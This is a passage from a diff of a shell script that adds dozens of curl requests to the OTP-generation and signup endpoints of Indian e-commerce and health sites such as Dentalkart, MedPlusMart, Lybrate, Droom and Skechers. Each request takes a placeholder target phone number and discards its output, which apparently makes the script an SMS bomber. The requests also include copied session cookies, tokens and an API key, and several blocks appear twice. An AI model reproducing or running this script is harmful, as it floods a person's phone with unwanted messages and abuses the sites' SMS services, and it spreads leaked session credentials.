+  -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36 Edg/111.0.1661.44' \
+  -H 'x-requested-with: XMLHttpRequest' \
+  --data-raw 'mobile_phone=€tor&email=hjhzgzcgd%40gmail.com&captcha_value=q6dqk&channel=' \
+  --compressed > /dev/null 2>&1
+  
+curl 'https://api-apollo.dentalkart.com/graphql' \
+  -H 'authority: api-apollo.dentalkart.com' \
+  -H 'accept: */*' \
+  -H 'accept-language: en-US,en;q=0.9' \
+  -H 'authorization;' \
+  -H 'content-type: application/json' \
+  -H 'cookies: country_id=IN; country=India; currency_code=INR; _gcl_au=1.1.2050323954.1679233791; _gid=GA1.2.268070877.1679233792; _dc_gtm_UA-73902580-1=1; _nv_sess=232384256.1679233952.kSuXhmF0gTG0uNEjMrZDbLdv0xENUFcMHGLxG86Akw66qVv0iI; _nv_uid=232384256.1679233952.7f02b1f8-ee36-4558-b0f4-0a7557ccbf93.1679233952.1679233952.1.0; _nv_utm=232384256.1679233952.1.1.dXRtc3JjPShkaXJlY3QpfHV0bWNjbj0oZGlyZWN0KXx1dG1jbWQ9KG5vbmUpfHV0bWN0cj0obm90IHNldCl8dXRtY2N0PShub3Qgc2V0KXxnY2xpZD0obm90IHNldCk=; _nv_did=232384256.1679233952.10318094170rczzb; _nv_hit=232384256.1679233952.cHZpZXc9MQ==; _ALGOLIA=anonymous-0f5e32fd-d22c-4341-8a73-8932d04f2cba; _fbp=fb.1.1679233792149.514608104; ln_or=eyIxMTUyNjUiOiJkIn0%3D; G_ENABLED_IDPS=google; _pin_unauth=dWlkPVltUmhZVFJqTm1JdE1qazBOaTAwTjJGbExXRTNOR0V0WkRSak9UVTRaR0l5WldZMg; _clck=1y24jie|1|fa1|0; _clsk=1oyr2b8|1679233794260|1|1|r.clarity.ms/collect; _ga=GA1.1.256003816.1679233792; _ga_L8SMBC7ZQ6=GS1.1.1679233802.1.0.1679233806.0.0.0' \
+  -H 'origin: https://www.dentalkart.com' \
+  -H 'platform: web' \
+  -H 'referer: https://www.dentalkart.com/' \
+  -H 'sec-ch-ua: "Microsoft Edge";v="111", "Not(A:Brand";v="8", "Chromium";v="111"' \
+  -H 'sec-ch-ua-mobile: ?0' \
+  -H 'sec-ch-ua-platform: "Windows"' \
+  -H 'sec-fetch-dest: empty' \
+  -H 'sec-fetch-mode: cors' \
+  -H 'sec-fetch-site: same-site' \
+  -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36 Edg/111.0.1661.44' \
+  -H 'x-api-key: da2-b7vqajjrfbgbvjf4fbesbavuhq' \
+  --data-raw '{"operationName":"createAccountOTP","variables":{"mobileNumber":"€tor","websiteId":1},"query":"mutation createAccountOTP($mobileNumber: String, $websiteId: Int) {\n  createAccountOTP(mobileNumber: $mobileNumber, websiteId: $websiteId) {\n    status\n    message\n    __typename\n  }\n}\n"}' \
+  --compressed > /dev/null 2>&1
+
+curl 'https://www.medplusmart.com/my-profile/getOtp?MOBILE_NUMBER=€tor&tokenId=804936CDD427D57A68744267199F8390&customerId=&timeStapm=2023-03-19T13:52:01.151Z' \
+  -H 'authority: www.medplusmart.com' \
+  -H 'accept: application/json, text/plain, */*' \
+  -H 'accept-language: en-US,en;q=0.9' \
+  -H 'cookie: ROUTEID=.jvm2; bm_sz=57CEC10489D5F07DF940EBCD8C617792~YAAQXW/ZF2i9Pb+GAQAAn1gm+hM6TTycNeo2IYluzrQQk9KVZAvebhbyMiTt2cQZMHQjAYiPh/0yx51aslT3oA323nGZkuayuREcR9Hws3QUD4369JpIYi21yCR1ZLo47HPkp3QmJ3IHL6CRBOIYQvdTlkRmcdPspT3UNrtSQMvD3zV6X4NXb6vPcPDoy/hmOlQYfVnXvhs6drMXxWDPp68B3WBgbie/aAxnfHI59PsTW5/LJbOubLJniP9upLabJWhEZCh4LTWyyMqnWwE6y5NoaoZ6R6KrvnRTEMt6CjgwJujElnZYgg==~4403768~4339249; bm_mi=6E38E55903BCC128AFC98528629CDDE4~YAAQXW/ZF269Pb+GAQAARVom+hO1x/fLeNUXb5pM6udVKl9+c4fEwekTz/5+Z8AyrBP+erhM0jLCUBeEPFgFLiJENLAls/C4/gh/a8y6JOr1kAJoaKRyWYXr5cR/hMLt0lqqjHzepQHm3eQfWcfbZD2YdVm5EoWmkhVyWnQSdo3V+3aciW/Y4neon/LFtnulXjqeJZZbGplo9DsD4CmYhNbfmXci/y6vMQAc9bI3ey8Aof9PyWxQ1MyCH1XF2alEoR+gnmF8W4PgqTJxBO7ocZmoNl43LiqCXNw9PBjCG+ByMEyVVDN/x9oSI8ry7lf3UppaXyrM6z1wpd4fcQ==~1; JSESSIONID=BF9DD7A69E6FF04758EA41ED55CEC84F; tokenId=804936CDD427D57A68744267199F8390; latLong="17.472083, 78.428701"; pincode=500018; b_token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiItMSIsImlzcyI6Ind3dy5tZWRwbHVzbWFydC5jb20iLCJleHAiOjE2NzkzMjA0Njh9.kp1tv-hD0fQWiS5g3iirPiM86oBd2Y-ftAS49zVKJy0; isLocalityMatured=Y; customerId=; ak_bmsc=D43C44A646BFCC9042CE950EDA6BB947~000000000000000000000000000000~YAAQXW/ZF5K9Pb+GAQAA3G4m+hNYKrNf4zY9ABJMwx45sczLxQgLo+ljoIcKZmwTU9aJcVp28VjWfiwwFdGtajPxYM1xbp74d7cxagJeaeNmGXX3TA6bmdlpYJskKd/o5TEa9kBshUpV/aDjsQg/sv3BtUm4UAE6ZAOEH1MKeUhYEBLov+lLH0FGa3cgjVsaEjGnDMu4EUa4feVxViIrYXosf9U/Y18dvKCTxoeH56YUvIlV/PltKRp3L0nsYUzQU7Uy17HTnU18Jzgvyct7jCFW8qQC/TaMffpgwvcH6YUp1TDAkcMwXxoJ4K+bYJWhlcbPl4JS/4w/qCtYN8zfNSbF31Zvi6jPuh+yxMIl/ywA4u7M2MQ9SEJQfEniJYg0GEB2ndXzNaR6QhL8fPTwNotiNW55FMdCXssZTUhAdMsXJzgXqMhTK4D4z90=; _gcl_au=1.1.1324041836.1679233908; bm_sv=233BC1E37EE60BF29EEE0B28B10CE90E~YAAQXW/ZF5a9Pb+GAQAAMnAm+hMh/37sY3LuRgfhfFRevraPN4l2YgI7DVKfsDbB7v7VRHOmFXOVcz/Y4q1IbfAAw2kTDGFfV8A+4IoeMyGMmrh0zOa0tyybnhrsjv6SPKqWuxHJIpjrDYagWX6/y4gZiesJnc7ogPMRubSn/SY3fPR3l9qImFS98e8HfFrHf7UzPhgRQG739jBCYqclR5opcLAtxu7Yv5tjA5X+gCiJ/rjdzKtS+qBBZmVPNzkzf6G6CUU=~1; _fbp=fb.1.1679233908251.327441531; _abck=5F76CF00257596748571D8F6CED4A71F~0~YAAQXW/ZF529Pb+GAQAAzHEm+gnXTre+m74Pv+bapmm0SzSKvV4Ji7o6G800G23rOjGx9pST1oYBvb+8p7jI15lUztzg22YMTKvYdSUxmqks9jQsHqVU/vQPTheeCJQsyGh+wx7N9ykJ1sGyMR/0eSXlacnhFlDCZVK1IhE3DudeZkOdX8HaSK47rE/+Ku3hkC7DlkQCfZV0BM433FpOPTpERxLfgLMLQ1iWhdZ739AMGVU1Z5gPMxx5+BEx1knmoQqpGO2gZEm3nVJKnnsvCbdo3GEGElOi/zl6+dZ1RfpRWDlxPpCnU8eAo1nlWfpI3K1GChN9bq8e+4WHwA7flO0WfEvLrwROt8QeTCfUUblSkxRCNbhsrDVlCWzi2pGncvRQnJDK5tcgietLoHC4zTYlZq1whcB9u19/Dm0e~-1~||-1||~-1; _clck=wam2q|1|fa1|0; _clsk=zsgkpg|1679233909166|1|1|r.clarity.ms/collect' \
+  -H 'referer: https://www.medplusmart.com/signInPopUp' \
+  -H 'sec-ch-ua: "Microsoft Edge";v="111", "Not(A:Brand";v="8", "Chromium";v="111"' \
+  -H 'sec-ch-ua-mobile: ?0' \
+  -H 'sec-ch-ua-platform: "Windows"' \
+  -H 'sec-fetch-dest: empty' \
+  -H 'sec-fetch-mode: cors' \
+  -H 'sec-fetch-site: same-origin' \
+  -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36 Edg/111.0.1661.44' \
+  -H 'x-requested-with: XMLHttpRequest' \
+  --compressed > /dev/null 2>&1
+  
+curl 'https://www.lybrate.com/p/login-signup' \
+  -H 'authority: www.lybrate.com' \
+  -H 'accept: application/json, text/plain, */*' \
+  -H 'accept-language: en-US,en;q=0.9' \
+  -H 'content-type: application/json;charset=UTF-8' \
+  -H 'cookie: JSESSIONID=DAAF78EA58DE06B736249DDA358D5FBD; countryCode=IN; latitude=0; longitude=0; suid=8a7631de-cca7-4d1c-87d7-82dba2d4bf7a; est="utm_source=DIRECT|"; _ga=GA1.2.2078038376.1679233966; _gid=GA1.2.1509245264.1679233966; _gat=1; _fbp=fb.1.1679233965937.1538342064; we_luid=cf208a13077826e5d2aa44cf756fd86f31a053f0; AWSALB=fU0zC/AV5v8rl5K6kGh/X2oqLSs+k9ZzSCxW7FDkKvGCMiYNx/syhSe7/Cg5UXxRZncc6uW/Gk6wmKy9pILh6ADX18wSpZDrpCqllh2uvJMXb9SSw6aMDU0xVtS9; AWSALBCORS=fU0zC/AV5v8rl5K6kGh/X2oqLSs+k9ZzSCxW7FDkKvGCMiYNx/syhSe7/Cg5UXxRZncc6uW/Gk6wmKy9pILh6ADX18wSpZDrpCqllh2uvJMXb9SSw6aMDU0xVtS9' \
+  -H 'origin: https://www.lybrate.com' \
+  -H 'referer: https://www.lybrate.com/signup' \
+  -H 'sec-ch-ua: "Microsoft Edge";v="111", "Not(A:Brand";v="8", "Chromium";v="111"' \
+  -H 'sec-ch-ua-mobile: ?0' \
+  -H 'sec-ch-ua-platform: "Windows"' \
+  -H 'sec-fetch-dest: empty' \
+  -H 'sec-fetch-mode: cors' \
+  -H 'sec-fetch-site: same-origin' \
+  -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36 Edg/111.0.1661.44' \
+  --data-raw '{"countryCode":"IN","firstName":"vhjgzz","email":"xvvcsv@gmail.com","mobile":"€tor","password":"123456854213"}' \
+  --compressed > /dev/null 2>&1
+  
+  
+curl 'https://kapeefit.com/public/views/templates/login/otp-verify.php?mobile=€tor' \
+  -H 'sec-ch-ua: "Microsoft Edge";v="111", "Not(A:Brand";v="8", "Chromium";v="111"' \
+  -H 'Accept: text/html, */*; q=0.01' \
+  -H 'Referer: https://kapeefit.com/login' \
+  -H 'X-Requested-With: XMLHttpRequest' \
+  -H 'sec-ch-ua-mobile: ?0' \
+  -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36 Edg/111.0.1661.44' \
+  -H 'sec-ch-ua-platform: "Windows"' \
+  --compressed > /dev/null 2>&1
+
+curl 'https://www.docgenie.in/apis//otp/generateotp.php' \
+  -H 'authority: www.docgenie.in' \
+  -H 'accept: application/json, text/plain, */*' \
+  -H 'accept-language: en-US,en;q=0.9' \
+  -H 'content-type: application/json' \
+  -H 'cookie: _gid=GA1.2.1342440784.1679234169; _gat_gtag_UA_172446656_1=1; _ga_WLL9BP8CB5=GS1.1.1679234169.1.0.1679234169.0.0.0; _gcl_au=1.1.807414040.1679234169; _fbp=fb.1.1679234169920.665095662; _clck=iaqxky|1|fa1|0; _clsk=13osg50|1679234170971|1|1|r.clarity.ms/collect; _ga=GA1.2.895373929.1679234169; _gat_UA-172446656-1=1' \
+  -H 'origin: https://www.docgenie.in' \
+  -H 'referer: https://www.docgenie.in/login' \
+  -H 'sec-ch-ua: "Microsoft Edge";v="111", "Not(A:Brand";v="8", "Chromium";v="111"' \
+  -H 'sec-ch-ua-mobile: ?0' \
+  -H 'sec-ch-ua-platform: "Windows"' \
+  -H 'sec-fetch-dest: empty' \
+  -H 'sec-fetch-mode: cors' \
+  -H 'sec-fetch-site: same-origin' \
+  -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36 Edg/111.0.1661.44' \
+  --data-raw '{"phoneno":"€tor","apptype":"WEB","token":"QWERTYMKIUIEDFRTYUTFRTEDFRTYGHYTFREDS123-WWE324567"}' \
+  --compressed > /dev/null 2>&1
+  
+ 
 curl 'https://1.rome.api.flipkart.com/api/7/user/otp/generate' \
   -H 'Accept: */*' \
   -H 'Accept-Language: en-US,en;q=0.9' \
@@ -1073,4 +1376,145 @@ curl 'https://api.tendercuts.in/otp/v2/generate/' \
   -H 'sec-fetch-site: same-site' \
   -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36' \
   --data-raw '{"mobile":"€tor","otp_mode":"SIGNUP"}' \
+  --compressed > /dev/null 2>&1
+  
+  curl 'https://api.tatadigital.com/api/v2/sso/check-phone' \
+  -H 'authority: api.tatadigital.com' \
+  -H 'accept: application/json, text/plain, */*' \
+  -H 'accept-language: en-US,en;q=0.9' \
+  -H 'client_id: CROMA-WEB-APP' \
+  -H 'content-type: application/json' \
+  -H 'cookie: SESSION=NjBhZjZjYTAtMjc1YS00M2YwLTliOTUtODVmNGRkZDQyODhl' \
+  -H 'origin: https://www.croma.com' \
+  -H 'referer: https://www.croma.com/' \
+  -H 'sec-ch-ua: "Microsoft Edge";v="111", "Not(A:Brand";v="8", "Chromium";v="111"' \
+  -H 'sec-ch-ua-mobile: ?0' \
+  -H 'sec-ch-ua-platform: "Windows"' \
+  -H 'sec-fetch-dest: empty' \
+  -H 'sec-fetch-mode: cors' \
+  -H 'sec-fetch-site: cross-site' \
+  -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36 Edg/111.0.1661.44' \
+  --data-raw '{"countryCode":"91","sendOtp":true,"phone":"€tor"}' \
+  --compressed > /dev/null 2>&1
+  
+curl 'https://www.skechers.in/on/demandware.store/Sites-skechersin-Site/default/Account-GenerateOTP?rurl=1' \
+  -H 'authority: www.skechers.in' \
+  -H 'accept: application/json, text/javascript, */*; q=0.01' \
+  -H 'accept-language: en-US,en;q=0.9' \
+  -H 'content-type: application/x-www-form-urlencoded; charset=UTF-8' \
+  -H 'cookie: sid=3-fBtiLG6qAgnCn2dbfa16Jc_jgPTnXDfW0; dwanonymous_994727fff0a64d37e3fbc8ef34b995e1=abvfEouUeqQ72gYmQ4f0V7RN96; __cq_dnt=1; dw_dnt=1; dwsid=kpSfv_j1dGQ9Xh-r8wPRRu8voDHVfesHYK9qIoCLBBDmo7RCjnkFA4VAUNV2Iztej8JhIGMn5HKbMSoTizisww==; _sfid_69f9={%22anonymousId%22:%22f97fa810e67eaa9c%22}; _evga_5fd7={%22uuid%22:%22f97fa810e67eaa9c%22}; _gcl_au=1.1.1537150235.1679232084; _gid=GA1.2.61017889.1679232084; _gat_UA-115788897-3=1; _ga_PW30J0KXP2=GS1.1.1679232084.1.0.1679232084.60.0.0; _hsu=hs.1679232084313.0d3dd0d24f; _hscl=; _fbp=fb.1.1679232084706.567973459; _clck=489ws|1|fa1|0; cto_bundle=ulWw5F9ld1ltJTJCbXBjQ1B1TkNBanhvV0RZUW5hVkhBd1NUaEclMkZ6JTJCdFoyJTJGYmQ4N2YxOVl0d3E0S3VsWk93MUFrd0JRWVQyZjgxVkxmdkNnTFpkeEdSWGliV0lQUiUyQnFGZWI2NXZ3b3klMkYlMkJsTVdmVXA1MVB6SlJPTm9xdDZzbndiaU9TZDZlTG9wZSUyRjd1ZnoxMzU1RjlObiUyQkdndVElM0QlM0Q; _ga=GA1.2.16812864.1679232084; _clsk=1g0lvcy|1679232086116|1|1|r.clarity.ms/collect' \
+  -H 'origin: https://www.skechers.in' \
+  -H 'referer: https://www.skechers.in/register/' \
+  -H 'sec-ch-ua: "Microsoft Edge";v="111", "Not(A:Brand";v="8", "Chromium";v="111"' \
+  -H 'sec-ch-ua-mobile: ?0' \
+  -H 'sec-ch-ua-platform: "Windows"' \
+  -H 'sec-fetch-dest: empty' \
+  -H 'sec-fetch-mode: cors' \
+  -H 'sec-fetch-site: same-origin' \
+  -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36 Edg/111.0.1661.44' \
+  -H 'x-requested-with: XMLHttpRequest' \
+  --data-raw 'dwfrm_profile_customer_phone=€tor&phoneLogin=true' \
+  --compressed > /dev/null 2>&1
+  
+curl 'https://droom.in/send-onboard-otp' \
+  -H 'authority: droom.in' \
+  -H 'accept: application/json, text/javascript, */*; q=0.01' \
+  -H 'accept-language: en-US,en;q=0.9' \
+  -H 'content-type: application/x-www-form-urlencoded; charset=UTF-8' \
+  -H 'cookie: locale=ZW4tSU4=; utfc=NGUzMDY5RGJHVlU3WlBxUw==; Path=/; __AP_SESSION__=e85751c8-9377-4574-8a9f-f4892ff81621; _gcl_au=1.1.1320272575.1679232395; _gid=GA1.2.355529121.1679232396; __gpi=UID=00000bdc0c1c3efd:T=1679232557:RT=1679232557:S=ALNI_MYLPimWWEz9miR5lkGhwpbgi9aPWw; _pbjs_userid_consent_data=3524755945110770; __qca=P0-581497079-1679232396575; _fbp=fb.1.1679232397084.433852724; __gads=ID=1f2dbc43d28c936a-22d88913dade00ce:T=1679232557:S=ALNI_MbBQp1Ex1J3iatUkV7nDMSLcrTjqA; _cc_id=8c8ab7dd09d41744a7b10dddbe68ae9; panoramaId_expiry=1679318957748; dcc=MA==; _ga_DX476DMQYC=GS1.1.1679232396.1.1.1679232459.0.0.0; _ga=GA1.1.60112228.1679232395; _gt=MjE4Y2ZhZjFlNWEzYTVlMA==; XSRF-TOKEN=eyJpdiI6Im9WWWxHNzNQdDY5TlpkMEdmRjhRZWc9PSIsInZhbHVlIjoiTmsvQ1Y4MWM3S3RZZEhwQTlDMlRaTVNTZksydjNEbjdWSWU4b29IWENkOHhEVzNQYW5xUm5UQWhMT0Fmakp1eEdFdE8xVndQWm1IQ3QwL2tBV2p4RXpucTUyOU1LT2JRYUV4c2tRY25iRmEvV0ZuYUVnb0N3Q3ByLzd4eFpVQjkiLCJtYWMiOiIyNzZmNGQyY2ZhNjYxNTgyMTFhMGMwZGJhOTk0ZmUxYjUwZmQ5MDZhYjUzYjA4MDMzZWFmMjcwY2JiNmFiMmMxIiwidGFnIjoiIn0%3D; laravel8_session=eyJpdiI6Ikt0N0VoZkEvVUdSQWpxT21YbFNRWXc9PSIsInZhbHVlIjoidTFiWjdINDVTS00rMXlLeXpIYkNqR1YraCtDTk10eExaQ001bElMcnlVSk9JSVA2SloxSXdsdGxJeTZ3Q3g2UUhEcUpWSHhMVnVtRE5VOEVXWFM3cW85eG5aSkM2c09RMy8rU1VReTlTRTM5aEdwekdZRlZnb1ZBV1NXRGptSmoiLCJtYWMiOiI3ZTU2Yzc1YmQ0NTQzNTY2MmYyZGNjM2NmNDU0NWY4MzQ1ZGYyODBhZDUwZDMzNjBiY2JiNTI0NTVlYzcxZWZjIiwidGFnIjoiIn0%3D' \
+  -H 'origin: https://droom.in' \
+  -H 'referer: https://droom.in/individual/account-signup' \
+  -H 'sec-ch-ua: "Microsoft Edge";v="111", "Not(A:Brand";v="8", "Chromium";v="111"' \
+  -H 'sec-ch-ua-mobile: ?0' \
+  -H 'sec-ch-ua-platform: "Windows"' \
+  -H 'sec-fetch-dest: empty' \
+  -H 'sec-fetch-mode: cors' \
+  -H 'sec-fetch-site: same-origin' \
+  -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36 Edg/111.0.1661.44' \
+  -H 'x-requested-with: XMLHttpRequest' \
+  --data-raw 'mobile_phone=€tor&email=hjhzgzcgd%40gmail.com&captcha_value=q6dqk&channel=' \
+  --compressed > /dev/null 2>&1
+  
+curl 'https://api-apollo.dentalkart.com/graphql' \
+  -H 'authority: api-apollo.dentalkart.com' \
+  -H 'accept: */*' \
+  -H 'accept-language: en-US,en;q=0.9' \
+  -H 'authorization;' \
+  -H 'content-type: application/json' \
+  -H 'cookies: country_id=IN; country=India; currency_code=INR; _gcl_au=1.1.2050323954.1679233791; _gid=GA1.2.268070877.1679233792; _dc_gtm_UA-73902580-1=1; _nv_sess=232384256.1679233952.kSuXhmF0gTG0uNEjMrZDbLdv0xENUFcMHGLxG86Akw66qVv0iI; _nv_uid=232384256.1679233952.7f02b1f8-ee36-4558-b0f4-0a7557ccbf93.1679233952.1679233952.1.0; _nv_utm=232384256.1679233952.1.1.dXRtc3JjPShkaXJlY3QpfHV0bWNjbj0oZGlyZWN0KXx1dG1jbWQ9KG5vbmUpfHV0bWN0cj0obm90IHNldCl8dXRtY2N0PShub3Qgc2V0KXxnY2xpZD0obm90IHNldCk=; _nv_did=232384256.1679233952.10318094170rczzb; _nv_hit=232384256.1679233952.cHZpZXc9MQ==; _ALGOLIA=anonymous-0f5e32fd-d22c-4341-8a73-8932d04f2cba; _fbp=fb.1.1679233792149.514608104; ln_or=eyIxMTUyNjUiOiJkIn0%3D; G_ENABLED_IDPS=google; _pin_unauth=dWlkPVltUmhZVFJqTm1JdE1qazBOaTAwTjJGbExXRTNOR0V0WkRSak9UVTRaR0l5WldZMg; _clck=1y24jie|1|fa1|0; _clsk=1oyr2b8|1679233794260|1|1|r.clarity.ms/collect; _ga=GA1.1.256003816.1679233792; _ga_L8SMBC7ZQ6=GS1.1.1679233802.1.0.1679233806.0.0.0' \
+  -H 'origin: https://www.dentalkart.com' \
+  -H 'platform: web' \
+  -H 'referer: https://www.dentalkart.com/' \
+  -H 'sec-ch-ua: "Microsoft Edge";v="111", "Not(A:Brand";v="8", "Chromium";v="111"' \
+  -H 'sec-ch-ua-mobile: ?0' \
+  -H 'sec-ch-ua-platform: "Windows"' \
+  -H 'sec-fetch-dest: empty' \
+  -H 'sec-fetch-mode: cors' \
+  -H 'sec-fetch-site: same-site' \
+  -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36 Edg/111.0.1661.44' \
+  -H 'x-api-key: da2-b7vqajjrfbgbvjf4fbesbavuhq' \
+  --data-raw '{"operationName":"createAccountOTP","variables":{"mobileNumber":"€tor","websiteId":1},"query":"mutation createAccountOTP($mobileNumber: String, $websiteId: Int) {\n  createAccountOTP(mobileNumber: $mobileNumber, websiteId: $websiteId) {\n    status\n    message\n    __typename\n  }\n}\n"}' \
+  --compressed > /dev/null 2>&1
+
+curl 'https://www.medplusmart.com/my-profile/getOtp?MOBILE_NUMBER=€tor&tokenId=804936CDD427D57A68744267199F8390&customerId=&timeStapm=2023-03-19T13:52:01.151Z' \
+  -H 'authority: www.medplusmart.com' \
+  -H 'accept: application/json, text/plain, */*' \
+  -H 'accept-language: en-US,en;q=0.9' \
+  -H 'cookie: ROUTEID=.jvm2; bm_sz=57CEC10489D5F07DF940EBCD8C617792~YAAQXW/ZF2i9Pb+GAQAAn1gm+hM6TTycNeo2IYluzrQQk9KVZAvebhbyMiTt2cQZMHQjAYiPh/0yx51aslT3oA323nGZkuayuREcR9Hws3QUD4369JpIYi21yCR1ZLo47HPkp3QmJ3IHL6CRBOIYQvdTlkRmcdPspT3UNrtSQMvD3zV6X4NXb6vPcPDoy/hmOlQYfVnXvhs6drMXxWDPp68B3WBgbie/aAxnfHI59PsTW5/LJbOubLJniP9upLabJWhEZCh4LTWyyMqnWwE6y5NoaoZ6R6KrvnRTEMt6CjgwJujElnZYgg==~4403768~4339249; bm_mi=6E38E55903BCC128AFC98528629CDDE4~YAAQXW/ZF269Pb+GAQAARVom+hO1x/fLeNUXb5pM6udVKl9+c4fEwekTz/5+Z8AyrBP+erhM0jLCUBeEPFgFLiJENLAls/C4/gh/a8y6JOr1kAJoaKRyWYXr5cR/hMLt0lqqjHzepQHm3eQfWcfbZD2YdVm5EoWmkhVyWnQSdo3V+3aciW/Y4neon/LFtnulXjqeJZZbGplo9DsD4CmYhNbfmXci/y6vMQAc9bI3ey8Aof9PyWxQ1MyCH1XF2alEoR+gnmF8W4PgqTJxBO7ocZmoNl43LiqCXNw9PBjCG+ByMEyVVDN/x9oSI8ry7lf3UppaXyrM6z1wpd4fcQ==~1; JSESSIONID=BF9DD7A69E6FF04758EA41ED55CEC84F; tokenId=804936CDD427D57A68744267199F8390; latLong="17.472083, 78.428701"; pincode=500018; b_token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiItMSIsImlzcyI6Ind3dy5tZWRwbHVzbWFydC5jb20iLCJleHAiOjE2NzkzMjA0Njh9.kp1tv-hD0fQWiS5g3iirPiM86oBd2Y-ftAS49zVKJy0; isLocalityMatured=Y; customerId=; ak_bmsc=D43C44A646BFCC9042CE950EDA6BB947~000000000000000000000000000000~YAAQXW/ZF5K9Pb+GAQAA3G4m+hNYKrNf4zY9ABJMwx45sczLxQgLo+ljoIcKZmwTU9aJcVp28VjWfiwwFdGtajPxYM1xbp74d7cxagJeaeNmGXX3TA6bmdlpYJskKd/o5TEa9kBshUpV/aDjsQg/sv3BtUm4UAE6ZAOEH1MKeUhYEBLov+lLH0FGa3cgjVsaEjGnDMu4EUa4feVxViIrYXosf9U/Y18dvKCTxoeH56YUvIlV/PltKRp3L0nsYUzQU7Uy17HTnU18Jzgvyct7jCFW8qQC/TaMffpgwvcH6YUp1TDAkcMwXxoJ4K+bYJWhlcbPl4JS/4w/qCtYN8zfNSbF31Zvi6jPuh+yxMIl/ywA4u7M2MQ9SEJQfEniJYg0GEB2ndXzNaR6QhL8fPTwNotiNW55FMdCXssZTUhAdMsXJzgXqMhTK4D4z90=; _gcl_au=1.1.1324041836.1679233908; bm_sv=233BC1E37EE60BF29EEE0B28B10CE90E~YAAQXW/ZF5a9Pb+GAQAAMnAm+hMh/37sY3LuRgfhfFRevraPN4l2YgI7DVKfsDbB7v7VRHOmFXOVcz/Y4q1IbfAAw2kTDGFfV8A+4IoeMyGMmrh0zOa0tyybnhrsjv6SPKqWuxHJIpjrDYagWX6/y4gZiesJnc7ogPMRubSn/SY3fPR3l9qImFS98e8HfFrHf7UzPhgRQG739jBCYqclR5opcLAtxu7Yv5tjA5X+gCiJ/rjdzKtS+qBBZmVPNzkzf6G6CUU=~1; _fbp=fb.1.1679233908251.327441531; _abck=5F76CF00257596748571D8F6CED4A71F~0~YAAQXW/ZF529Pb+GAQAAzHEm+gnXTre+m74Pv+bapmm0SzSKvV4Ji7o6G800G23rOjGx9pST1oYBvb+8p7jI15lUztzg22YMTKvYdSUxmqks9jQsHqVU/vQPTheeCJQsyGh+wx7N9ykJ1sGyMR/0eSXlacnhFlDCZVK1IhE3DudeZkOdX8HaSK47rE/+Ku3hkC7DlkQCfZV0BM433FpOPTpERxLfgLMLQ1iWhdZ739AMGVU1Z5gPMxx5+BEx1knmoQqpGO2gZEm3nVJKnnsvCbdo3GEGElOi/zl6+dZ1RfpRWDlxPpCnU8eAo1nlWfpI3K1GChN9bq8e+4WHwA7flO0WfEvLrwROt8QeTCfUUblSkxRCNbhsrDVlCWzi2pGncvRQnJDK5tcgietLoHC4zTYlZq1whcB9u19/Dm0e~-1~||-1||~-1; _clck=wam2q|1|fa1|0; _clsk=zsgkpg|1679233909166|1|1|r.clarity.ms/collect' \
+  -H 'referer: https://www.medplusmart.com/signInPopUp' \
+  -H 'sec-ch-ua: "Microsoft Edge";v="111", "Not(A:Brand";v="8", "Chromium";v="111"' \
+  -H 'sec-ch-ua-mobile: ?0' \
+  -H 'sec-ch-ua-platform: "Windows"' \
+  -H 'sec-fetch-dest: empty' \
+  -H 'sec-fetch-mode: cors' \
+  -H 'sec-fetch-site: same-origin' \
+  -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36 Edg/111.0.1661.44' \
+  -H 'x-requested-with: XMLHttpRequest' \
+  --compressed > /dev/null 2>&1
+  
+curl 'https://www.lybrate.com/p/login-signup' \
+  -H 'authority: www.lybrate.com' \
+  -H 'accept: application/json, text/plain, */*' \
+  -H 'accept-language: en-US,en;q=0.9' \
+  -H 'content-type: application/json;charset=UTF-8' \
